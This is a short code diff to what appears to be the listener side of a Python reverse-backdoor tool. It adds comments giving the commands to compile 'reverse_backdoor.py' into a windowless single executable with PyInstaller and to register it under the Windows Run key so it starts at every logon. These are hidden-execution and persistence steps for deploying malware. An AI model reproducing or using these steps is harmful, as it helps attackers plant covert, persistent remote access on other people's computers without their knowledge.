@@ -3,6 +3,10 @@ import json
 import subprocess
 import base64
 
+# C:\Users\User\AppData\Local\Programs\Python\Python311\Scripts\pyinstaller.exe reverse_backdoor.py --onefile --noconsole
+
+# reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "reverse_backdoor.exe"
+
 class Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
